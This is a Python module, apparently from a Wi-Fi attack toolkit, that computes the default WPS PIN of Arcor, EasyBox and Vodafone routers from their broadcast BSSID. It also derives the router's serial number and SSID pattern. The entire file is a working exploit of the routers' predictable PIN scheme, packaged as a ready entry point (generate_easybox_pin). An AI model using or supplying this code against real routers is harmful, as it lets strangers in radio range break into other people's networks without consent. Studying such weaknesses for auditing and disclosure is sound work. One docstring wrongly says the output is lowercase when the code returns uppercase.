"""EasyBox WPS PIN generation algorithm.

Ported from easybox_wps.py and Default-wps-pin/default-wps-pin.py to Python 3.
Generates default WPS PINs for Arcor/EasyBox/Vodafone routers based on BSSID.
"""

import re

from .pin_utils import wps_pin_checksum


def gen_pin(mac_str, sn):
    """Generate a WPS PIN for an EasyBox router.

    Args:
        mac_str: 12-character hex string of the MAC address (no separators).
        sn: 10-character serial number string (format: 'R----XXXXX').

    Returns:
        WPS PIN as a string (7 digits + 1 checksum digit).
    """
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0] * 5 + [int(x) for x in sn[5:]]
    hpin = [0] * 7

    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9]
    hpin[1] = k1 ^ sn_int[8]
    hpin[2] = k2 ^ mac_int[9]
    hpin[3] = k2 ^ mac_int[10]
    hpin[4] = mac_int[10] ^ sn_int[9]
    hpin[5] = mac_int[11] ^ sn_int[8]
    hpin[6] = k1 ^ sn_int[7]
    pin = int(
        '%1X%1X%1X%1X%1X%1X%1X' % (
            hpin[0], hpin[1], hpin[2], hpin[3],
            hpin[4], hpin[5], hpin[6]
        ),
        16
    ) % 10000000

    checksum = wps_pin_checksum(pin)
    return '%07i%i' % (pin, checksum)


def derive_serial_number(mac_str):
    """Derive the serial number from a MAC address.

    Args:
        mac_str: 12-character hex string of the MAC address (no separators).

    Returns:
        10-character serial number string.
    """
    return 'R----%05i' % int(mac_str[8:12], 16)


def derive_ssid(mac_str, sn):
    """Derive the SSID from a MAC address and serial number.

    Args:
        mac_str: 12-character hex string of the MAC address (no separators).
        sn: 10-character serial number string.

    Returns:
        SSID pattern string.
    """
    return 'Arcor|EasyBox|Vodafone-%c%c%c%c%c%c' % (
        mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9]
    )


def parse_bssid(bssid):
    """Parse a BSSID string into a clean 12-char hex string.

    Args:
        bssid: MAC address string in any format (e.g., '38:22:9D:11:22:33').

    Returns:
        12-character hex string (lowercase) with separators removed.

    Raises:
        ValueError: If the resulting hex string is not 12 characters.
    """
    mac_str = re.sub(r'[^a-fA-F0-9]', '', bssid)
    if len(mac_str) != 12:
        raise ValueError("Invalid MAC address format: expected 12 hex digits")
    return mac_str.upper()


def generate_easybox_pin(bssid):
    """Generate the default WPS PIN for an EasyBox router from its BSSID.

    This is the main entry point that combines all steps.

    Args:
        bssid: MAC address string (e.g., '38:22:9D:11:22:33').

    Returns:
        Dictionary with keys: 'pin', 'serial_number', 'ssid'.
    """
    mac_str = parse_bssid(bssid)
    sn = derive_serial_number(mac_str)
    pin = gen_pin(mac_str, sn)
    ssid = derive_ssid(mac_str, sn)
    return {
        'pin': pin,
        'serial_number': sn,
        'ssid': ssid,
    }
